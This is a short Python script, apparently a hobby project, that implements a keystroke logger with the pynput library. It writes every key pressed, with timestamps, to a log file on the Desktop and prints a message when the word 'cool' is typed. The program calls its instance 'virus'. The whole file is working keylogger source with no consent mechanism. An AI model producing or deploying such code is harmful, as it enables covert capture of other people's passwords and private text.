from pynput.keyboard import Key, Listener
import logging, os


class KeyLogger:
    def __init__(self):
        self.log_dir = os.path.expanduser('~/Desktop')

        logging.basicConfig(filename=(self.log_dir + '\Key_log.txt'),
                            level=logging.DEBUG,
                            format='%(asctime)s: %(message)s')

        self.coolList = [0, 0, 0, 0]

    def on_press(self, key):
        logging.info(key)
        self.coolList.pop(0)
        self.coolList.append(str(key))
        self.check()

    def run(self):
        with Listener(on_press=self.on_press) as listener:
            listener.join()

    def check(self):
        #print(self.coolList)
        b = ["'c'", "'o'", "'o'", "'l'"]
        #print(type(self.coolList[0]))
        if self.coolList == b:
            print('COOL!!!')




def main():
    virus = KeyLogger()
    virus.run()

if __name__ == '__main__':
    main()
